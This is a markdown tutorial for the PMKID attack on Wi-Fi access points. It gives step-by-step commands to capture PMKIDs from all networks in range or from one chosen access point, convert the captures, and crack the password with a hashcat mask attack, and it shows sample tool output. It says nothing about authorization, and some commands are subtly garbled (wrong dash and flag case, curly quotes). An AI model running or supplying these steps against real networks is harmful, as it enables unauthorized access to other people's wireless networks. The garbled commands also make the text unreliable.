# PKMID attack method

With this method we only to capture one EOPOL frame from the target Access Point. There is no need to capture the four-way handshake between AP and station.

Ensure that before you start you have 'hcxdumptool', 'hcxtools' and 'hashcat' installed. Then bring the wireless adapter into monitor mode as shown in section 0.
```
sudo apt install hcxdumptool
sudo apt install hcxtools
sudo apt install hashcat
```

## Collect PMKIDs

With hcxdumptool there is a mass collection command of all PMKID in the vicinity of the wireless adapter. 

`# hcxdumptool -o [name_of_your_city].pcapng -i [name_if_your_wireless_interface] --enable_status 1`

Once the tool is running you can see something as follows:
```
NMEA 0183 SENTENCE........: N/A
INTERFACE NAME............: wlan0
INTERFACE HARDWARE MAC....: 00c0caa763ed
DRIVER....................: rt2800usb
DRIVER VERSION............: 5.9.0-kali5-amd64
DRIVER FIRMWARE VERSION...: 0.36
ERRORMAX..................: 100 errors
BPF code blocks...........: 0
FILTERLIST ACCESS POINT...: 0 entries
FILTERLIST CLIENT.........: 0 entries
FILTERMODE................: unused
WEAK CANDIDATE............: 12345678
ESSID list................: 0 entries
ACCESS POINT (ROGUE)......: 000dc264d261 (BROADCAST HIDDEN)
ACCESS POINT (ROGUE)......: 000dc264d262 (BROADCAST OPEN)
ACCESS POINT (ROGUE)......: 000dc264d263 (incremented on every new client)
CLIENT (ROGUE)............: dc7014c7d40d
EAPOLTIMEOUT..............: 20000 usec
EAPOLEAPTIMEOUT...........: 2500000 usec
REPLAYCOUNT...............: 63766
ANONCE....................: 40dd6b5036920e12f4a94d46c1e829858fba325487eb8fe14f34309b01553193
SNONCE....................: 63d0cfd87c0429cb52ae257f06e32ce8e27b8a6866157d850b1c7bf1052a5a40
```

To stop the capture use ctrl+c.

Now we need to convert what we have to a format suitable for cracking with hashcat. Use the following command:

`# hcxpcaptool -E essidlist -I identitylist -U usernamelist -z [name_of_your_city].16800 [name_of_your_city].pcapng`

## Second method, targeted towards a single Acess Point

Ensure your wireless adapter is placed in monitor mode, as before. Then use 'airodump-ng' to scour for possible APs to target.

```
 $ sudo airodump-ng [interface_name]
```

Save the BSSID of your target AP, such as '00:11:22:33:44:55' without colons to a text file.

```
 $ echo '001122334455' >> mac_to_crack.txt
```
Obtain the hash of the PKMID of the mac
```
 $ sudo hcxdumptool –o hash –I [interface_name] --filterlist=mac_to_crack.txt --filtermode=2 --enable_status=3
```
Then use 'hcxpcaptool' to convert pcap file to one hashcat can use
```
 $ sudo hcxpcaptool -z hashtocrack hash
```
Finally we can start cracking with hashcat
```
 $ sudo hashcat -m 16800 hashtocrack -a 3 -w 3 ‘?u?d?u?d?d65D’ --force
```

Using the same command with --show will print the password
